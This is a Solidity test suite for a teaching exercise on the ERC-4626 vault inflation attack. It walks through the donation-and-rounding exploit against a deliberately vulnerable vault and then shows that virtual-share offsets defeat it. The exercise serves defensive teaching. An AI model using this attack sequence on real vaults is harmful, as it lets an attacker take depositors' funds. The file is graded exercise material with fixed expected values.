// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// ============================================================================
//  DO NOT MODIFY THIS FILE — it is the test suite for the InflationAttack
//  exercise. Implement DefendedVault.sol to make the defended tests pass.
//
//  Test 1 uses the pre-built NaiveVault (no student code needed).
//  Tests 2-3 use DefendedVault (student implements _convertToShares/Assets).
// ============================================================================

import "forge-std/Test.sol";

import {MockERC20} from "../../../src/part2/module7/mocks/MockERC20.sol";
import {NaiveVault} from "../../../src/part2/module7/NaiveVault.sol";
import {DefendedVault} from "../../../src/part2/module7/DefendedVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract InflationAttackTest is Test {
    MockERC20 usdc;
    NaiveVault naiveVault;
    DefendedVault defendedVault;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    address alice = makeAddr("alice");

    function setUp() public {
        usdc = new MockERC20("USD Coin", "USDC", 6);

        naiveVault = new NaiveVault(
            IERC20(address(usdc)), "Naive Vault", "nUSDC"
        );
        defendedVault = new DefendedVault(
            IERC20(address(usdc)), "Defended Vault", "dUSDC", 3
        );

        // Fund attacker and victim for attack tests
        usdc.mint(attacker, 30_000e6);
        usdc.mint(victim, 20_000e6);
    }

    // =========================================================
    //  Attack on NaiveVault — attacker profits ~5,000 USDC
    // =========================================================

    function test_Attack_NaiveVault_AttackerProfits() public {
        // ── Step 1: Attacker deposits 1 wei of USDC ──
        vm.startPrank(attacker);
        usdc.approve(address(naiveVault), type(uint256).max);
        naiveVault.deposit(1, attacker);

        // Attacker has 1 share. totalAssets = 1, totalSupply = 1.
        assertEq(naiveVault.balanceOf(attacker), 1, "Attacker should have 1 share");

        // ── Step 2: Attacker donates 10,000 USDC directly via transfer ──
        // This bypasses deposit() — no shares minted, but totalAssets jumps.
        usdc.transfer(address(naiveVault), 10_000e6);
        vm.stopPrank();

        // totalAssets = 10,000,000,001 (inflated!), totalSupply = 1
        assertEq(
            naiveVault.totalAssets(),
            10_000_000_001,
            "Vault totalAssets should be inflated to ~10,000 USDC"
        );

        // ── Step 3: Victim deposits 20,000 USDC ──
        // shares = 20,000e6 × 1 / 10,000,000,001 = 1 (floor from ~2)
        vm.startPrank(victim);
        usdc.approve(address(naiveVault), type(uint256).max);
        naiveVault.deposit(20_000e6, victim);
        vm.stopPrank();

        // Victim got ROBBED — only 1 share for 20,000 USDC!
        assertEq(
            naiveVault.balanceOf(victim),
            1,
            "Victim should only get 1 share (inflation attack!)"
        );

        // ── Step 4: Attacker redeems ──
        // Both hold 1 share each. Attacker gets 50% of 30,000 USDC.
        // assets = 1 × 30,000,000,001 / 2 = 15,000,000,000 (floor)
        vm.prank(attacker);
        uint256 attackerReceived = naiveVault.redeem(1, attacker, attacker);

        // --- Attacker gets 15,000 USDC — profit of ~5,000 USDC ---
        assertEq(
            attackerReceived,
            15_000_000_000,
            "Attacker should receive 15,000 USDC"
        );

        // --- Attack was profitable ---
        // Attacker spent: 1 wei (deposit) + 10,000 USDC (donation) ≈ 10,000 USDC
        // Attacker received: 15,000 USDC → profit ≈ 5,000 USDC
        assertGt(
            attackerReceived,
            10_000e6,
            "Attack should be profitable (received > donated)"
        );

        // --- Victim's remaining value ---
        // Victim has 1 share, vault holds 15,000,000,001. Victim can redeem ~15,000 USDC.
        // Victim deposited 20,000 USDC → lost ~5,000 USDC.
        assertEq(
            naiveVault.totalAssets(),
            15_000_000_001,
            "Remaining vault assets should be ~15,000 USDC"
        );
    }

    // =========================================================
    //  Same attack on DefendedVault — attacker LOSES ~9,994 USDC
    // =========================================================

    function test_Attack_DefendedVault_AttackerLoses() public {
        // ── Step 1: Attacker deposits 1 wei ──
        vm.startPrank(attacker);
        usdc.approve(address(defendedVault), type(uint256).max);
        defendedVault.deposit(1, attacker);
        vm.stopPrank();

        // With virtual shares (offset=3), first deposit gets:
        //   shares = mulDiv(1, 0 + 1000, 0 + 1) = 1000
        // NOT 1 share — virtual shares scale the first deposit.
        assertEq(
            defendedVault.balanceOf(attacker),
            1000,
            "Attacker should get 1000 shares (virtual share scaling)"
        );

        // ── Step 2: Attacker donates 10,000 USDC ──
        vm.prank(attacker);
        usdc.transfer(address(defendedVault), 10_000e6);

        // ── Step 3: Victim deposits 20,000 USDC ──
        // shares = mulDiv(20,000e6, 1000 + 1000, 10,000,000,001 + 1, Floor)
        //        = 40,000,000,000,000 / 10,000,000,002 = 3,999,999
        // Victim gets ~4M shares — PROPERLY proportional!
        vm.startPrank(victim);
        usdc.approve(address(defendedVault), type(uint256).max);
        defendedVault.deposit(20_000e6, victim);
        vm.stopPrank();

        uint256 victimShares = defendedVault.balanceOf(victim);
        assertEq(
            victimShares,
            3_999_999,
            "Victim should get 3,999,999 shares (properly proportional)"
        );

        // Victim has ~4000× more shares than attacker — the donation didn't help
        assertGt(
            victimShares,
            defendedVault.balanceOf(attacker) * 3000,
            "Victim should have vastly more shares than attacker"
        );

        // ── Step 4: Attacker redeems ──
        // assets = mulDiv(1000, 30,000,000,002, 5,001,999, Floor) = 5,997,602
        // totalSupply = 1000 + 3,999,999 = 4,000,999
        // denominator = 4,000,999 + 1000 = 5,001,999
        vm.prank(attacker);
        uint256 attackerReceived = defendedVault.redeem(1000, attacker, attacker);

        // --- Attacker gets ~6 USDC — lost ~9,994 USDC! ---
        assertEq(
            attackerReceived,
            5_997_602,
            "Attacker should receive ~6 USDC (virtual shares diluted the donation)"
        );

        // --- Attack was MASSIVELY unprofitable ---
        assertLt(
            attackerReceived,
            10_000e6,
            "Attack should be unprofitable (received << donated)"
        );
    }

    // =========================================================
    //  DefendedVault normal operations — virtual shares don't
    //  break normal deposit/yield/redeem cycles
    // =========================================================

    function test_Defended_NormalOperations() public {
        usdc.mint(alice, 1000e6);

        // ── Alice deposits 1000 USDC ──
        vm.startPrank(alice);
        usdc.approve(address(defendedVault), type(uint256).max);
        uint256 shares = defendedVault.deposit(1000e6, alice);
        vm.stopPrank();

        // First deposit: shares = 1000e6 × (0 + 1000) / (0 + 1) = 1e12
        assertEq(
            shares,
            1_000_000_000_000,
            "First deposit should mint assets * 1000 shares"
        );

        // ── Simulate 100 USDC yield ──
        usdc.mint(address(defendedVault), 100e6);

        assertEq(defendedVault.totalAssets(), 1100e6, "Vault should hold 1100 USDC");

        // ── Alice redeems all shares ──
        // assets = mulDiv(1e12, 1,100,000,000 + 1, 1e12 + 1000, Floor)
        //        = 1,099,999,999
        vm.prank(alice);
        uint256 aliceAssets = defendedVault.redeem(shares, alice, alice);

        // Alice should get ~1100 USDC (minus 1 wei from virtual share dilution)
        assertEq(
            aliceAssets,
            1_099_999_999,
            "Alice should get ~1100 USDC (minus 1 wei virtual share loss)"
        );

        // The loss is exactly 1 raw unit (0.000001 USDC) — completely negligible
        uint256 idealReturn = 1100e6;
        uint256 virtualShareLoss = idealReturn - aliceAssets;
        assertEq(
            virtualShareLoss,
            1,
            "Virtual share loss should be exactly 1 raw unit (negligible)"
        );
    }
}
